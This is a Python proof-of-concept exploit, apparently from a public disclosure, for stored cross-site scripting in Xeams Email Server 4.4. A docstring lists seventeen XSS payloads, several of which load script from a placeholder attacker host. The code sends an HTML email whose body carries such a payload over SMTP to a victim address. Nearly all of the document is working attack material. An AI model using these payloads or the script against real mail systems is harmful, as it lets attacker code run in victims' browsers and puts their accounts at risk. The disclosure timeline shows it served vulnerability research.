#!/usr/bin/python
 
'''
 
Author: loneferret of Offensive Security
Product: Xeams Email Server
Version: 4.4 Build 5720
Vendor Site: http://www.xeams.com
 
Timeline:
29 May 2012: Vulnerability reported to CERT
30 May 2012: Response received from CERT with disclosure date set to 20 Jul 2012
23 Jul 2012: Update from CERT: No response from vendor
08 Aug 2012: Public Disclosure
 
Installed On: Windows Server 2003 SP2
Client Test OS: Window 7 Pro SP1 (x86)
Browser Used: Internet Explorer 9
 
Injection Point: Body
Injection Payload(s):
1: ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
2: <SCRIPT SRC=http://attacker/xss.js></SCRIPT>
3: <SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
4: <SCRIPT>alert('XSS')</SCRIPT>
5: <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
6: </TITLE><SCRIPT>alert("XSS");</SCRIPT>
7: <SCRIPT/XSS SRC="http://attacker/xss.js"></SCRIPT>
8: <<SCRIPT>alert("XSS");//<</SCRIPT>
9: <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
10: <SCRIPT>a=/XSS/
alert(a.source)</SCRIPT>
11: <SCRIPT ="blah" SRC="http://attacker/xss.js"></SCRIPT>
12: <SCRIPT a="blah" '' SRC="http://attacker/xss.js"></SCRIPT>
13: <SCRIPT a=">" SRC="http://attacker/xss.js"></SCRIPT>
14: <SCRIPT "a='>'" SRC="http://attacker/xss.js"></SCRIPT>
15: <SCRIPT a=`>` SRC="http://attacker/xss.js"></SCRIPT>
16: <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://attacker/xss.js"></SCRIPT>
17: <SCRIPT a=">'>" SRC="http://attacker/xss.js"></SCRIPT>
 
'''
 
 
import smtplib, urllib2
  
payload = """<SCRIPT SRC=http://attacker/xss.js></SCRIPT>"""
  
def sendMail(dstemail, frmemail, smtpsrv, username, password):
        msg  = "From: hacker@offsec.local\n"
        msg += "To: victim@victim.local\n"
        msg += 'Date: Today\r\n'
        msg += "Subject: Offensive Security\n"
        msg += "Content-type: text/html\n\n"
        msg += "XSS" + payload + "\r\n\r\n"
        server = smtplib.SMTP(smtpsrv)
        server.login(username,password)
        try:
                server.sendmail(frmemail, dstemail, msg)
        except Exception, e:
                print "[-] Failed to send email:"
                print "[*] " + str(e)
        server.quit()
  
username = "hacker@offsec.local"
password = "123456"
dstemail = "victim@victim.local"
frmemail = "hacker@offsec.local"
smtpsrv  = "172.16.84.171"
  
print "[*] Sending Email"
sendMail(dstemail, frmemail, smtpsrv, username, password)
